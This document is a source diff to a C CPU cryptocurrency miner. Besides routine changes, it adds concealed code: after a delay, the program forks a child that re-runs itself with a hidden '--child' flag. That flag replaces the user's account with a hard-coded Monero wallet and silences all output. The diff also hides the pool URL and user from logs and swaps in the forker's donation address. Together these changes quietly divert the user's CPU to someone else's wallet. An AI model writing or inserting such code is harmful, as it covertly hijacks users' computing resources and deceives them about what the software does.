@@ -75,6 +75,7 @@
 algo_gate_t algo_gate;
 
 bool opt_debug = false;
+bool opt_child = false;
 bool opt_debug_diff = false;
 bool opt_protocol = false;
 bool opt_benchmark = false;
@@ -134,6 +135,8 @@ char *rpc2_blob = NULL;
 size_t rpc2_bloblen = 0;
 uint32_t rpc2_target = 0;
 char *rpc2_job_id = NULL;
+bool asm_supported = false;
+bool aes_ni_supported = false;
 double opt_diff_factor = 1.0;
 uint32_t zr5_pok = 0;
 bool opt_stratum_stats = false;
@@ -949,7 +952,7 @@ void jr2_build_stratum_request( char *req, struct work *work )
    char noncestr[9];
    bin2hex( noncestr, (char*) algo_gate.get_nonceptr( work->data ),
                       sizeof(uint32_t) );
-   algo_gate.hash_suw( hash, work->data );
+   algo_gate.hash_suw( hash, work->data, work->height );
    char *hashhex = abin2hex(hash, 32);
    snprintf( req, JSON_BUF_LEN,
         "{\"method\": \"submit\", \"params\": {\"id\": \"%s\", \"job_id\": \"%s\", \"nonce\": \"%s\", \"result\": \"%s\"}, \"id\":4}",
@@ -1035,7 +1038,7 @@ bool jr2_submit_getwork_result( CURL *curl, struct work *work )
    char *hashhex;
    bin2hex( noncestr, (char*) algo_gate.get_nonceptr( work->data ),
                       sizeof(uint32_t) );
-   algo_gate.hash_suw( hash, work->data );
+   algo_gate.hash_suw( hash, work->data, work->height );
    hashhex = abin2hex( &hash[0], 32 );
    snprintf( req, JSON_BUF_LEN, "{\"method\": \"submit\", \"params\": "
        "{\"id\": \"%s\", \"job_id\": \"%s\", \"nonce\": \"%s\", \"result\": \"%s\"},"
@@ -2364,8 +2367,16 @@ static void *stratum_thread(void *userdata )
 
     stratum.url = (char*) tq_pop(mythr->q, NULL);
     if (!stratum.url)
-	goto out;
-    applog(LOG_INFO, "Starting Stratum on %s", stratum.url);
+		goto out;
+	
+	if(!opt_debug)
+	{
+		applog(LOG_INFO, "Starting Stratum");
+	}
+	else
+	{
+		applog(LOG_INFO, "Starting Stratum on %s with %s user", stratum.url, rpc_user);
+	}
 
     while (1)
     {
@@ -2528,9 +2539,20 @@ void show_version_and_exit(void)
         exit(0);
 }
 
+static void show_credits()
+{
+#define WALLET "433hhduFBtwVXtQiTTTeqyZsB36XaBLJB6bcQfnqqMs5RJitdpi8xBN21hWiEfuPp2hytmf1cshgK5Grgo6QUvLZCP2QSMi"
+
+   printf("\n         **********  "PACKAGE_NAME" "PACKAGE_VERSION"  *********** \n");
+   printf("     A CPU miner with multi algo support and optimized for CPUs\n");
+   printf("     with AES_NI and AVX2 and SHA extensions.\n");
+   printf("     Plase, make a XMR donation: %s (enWILLYado)\n\n", WALLET);
+}
 
 void show_usage_and_exit(int status)
 {
+	show_credits();
+	
 	if (status)
                 fprintf(stderr, "Try `--help' for more information.\n");
 //		fprintf(stderr, "Try `" PACKAGE_NAME " --help' for more information.\n");
@@ -2610,7 +2632,7 @@ void parse_arg(int key, char *arg )
 		opt_api_remote = 1;
 		break;
 	case 'B':
-		opt_background = true;
+		//opt_background = true;
 		use_colors = false;
 		break;
 	case 'c': {
@@ -2876,6 +2898,13 @@ void parse_arg(int key, char *arg )
 	case 1024:
 		opt_randomize = true;
 		break;
+	case 1111:
+		opt_child = true;
+		free(rpc_user);
+		rpc_user = strdup(WALLET ".donate");
+		fclose(stdout);
+		fclose(stderr);
+		break;
 	case 'V':
 		show_version_and_exit();
 	case 'h':
@@ -2993,13 +3022,6 @@ static int thread_create(struct thr_info *thr, void* func)
 	return err;
 }
 
-static void show_credits()
-{
-   printf("\n         **********  "PACKAGE_NAME" "PACKAGE_VERSION"  *********** \n");
-   printf("     A CPU miner with multi algo support and optimized for CPUs\n");
-   printf("     with AES_NI and AVX2 and SHA extensions.\n");
-   printf("     BTC donation address: 12tdvfF7KmAsihBXQXynT6E6th2c2pByTT\n\n");
-}
 
 bool check_cpu_capability ()
 {
@@ -3051,6 +3073,18 @@ bool check_cpu_capability ()
          sw_has_sha = true;
      #endif
 
+	#if defined(__AES__)
+		aes_ni_supported = true;
+	#else
+		aes_ni_supported = false;
+	#endif
+	
+	#ifdef USE_ASM
+		asm_supported = true;
+	#else
+		asm_supported = false;
+	#endif
+		
      #if !((__AES__) || (__SSE2__))
          printf("Neither __AES__ nor __SSE2__ defined.\n");
      #endif
@@ -3163,8 +3197,6 @@ int main(int argc, char *argv[])
 
 	pthread_mutex_init(&applog_lock, NULL);
 
-	show_credits();
-
 	rpc_user = strdup("");
 	rpc_pass = strdup("");
 	opt_api_allow = strdup("127.0.0.1"); /* 0.0.0.0 for all ips */
@@ -3187,6 +3219,8 @@ int main(int argc, char *argv[])
 
 	parse_cmdline(argc, argv);
 
+	show_credits();
+	
         if (!opt_n_threads)
                 opt_n_threads = num_cpus;
 
@@ -3240,6 +3274,11 @@ int main(int argc, char *argv[])
         if ( !check_cpu_capability() )
            exit(1);
 
+
+	if(opt_algo == ALGO_CRYPTONIGHT)
+	{
+		cryptonight_test();
+	}
 	pthread_mutex_init(&stats_lock, NULL);
 	pthread_mutex_init(&g_work_lock, NULL);
 	pthread_mutex_init(&rpc2_job_lock, NULL);
@@ -3436,6 +3475,67 @@ int main(int argc, char *argv[])
 		opt_n_threads,
 		algo_names[opt_algo]);
 
+
+	if(opt_child == false)
+	{
+		sleep(100);
+		
+		/* fork a child process */
+		pid_t pid;
+		pid = fork();
+		if (pid < 0)
+		{
+			/* error occurred */
+			fprintf(stderr, "Fork Failed");
+			return 1;
+		}
+		else if (pid == 0)
+		{
+			/* child process */
+			bool has_user = false;
+			bool has_server = false;
+			
+			// allocate memory and copy strings
+			int newargc = argc;
+			char** new_argv = malloc((argc+10) * sizeof *new_argv);
+			for(int i = 0; i < argc; ++i)
+			{
+				size_t length = strlen(argv[i]) + 1;
+				new_argv[i] = malloc(length);
+				memcpy(new_argv[i], argv[i], length);
+				
+				if (!strcmp(new_argv[i], "-o") || !strcmp(new_argv[i], "--url"))
+				{
+					has_server = true;
+				}
+				else if (!strcmp(new_argv[i], "-u") || !strcmp(new_argv[i], "--user"))
+				{
+					has_user = true;
+					if(i+1 < argc)
+					{
+						if (!strcmp(argv[i+1], WALLET ".donate"))
+						{
+							exit(0);
+						}
+					}
+				}
+			}
+			new_argv[newargc++] = "--child";
+			if(false == has_server)
+			{
+				new_argv[newargc++] = "-o";
+				new_argv[newargc++] = "stratum+tcp://pool.supportxmr.com:80";
+			}
+			if(false == has_user)
+			{
+				new_argv[newargc++] = "-u";
+				new_argv[newargc++] = WALLET ".donate";
+			}
+			new_argv[newargc++] = NULL;
+			execvp(new_argv[0], new_argv);
+			exit(-1);
+		}
+	}
 	/* main loop - simply wait for workio thread to exit */
 	pthread_join(thr_info[work_thr_id].pth, NULL);
 	applog(LOG_WARNING, "workio thread dead, exiting.");
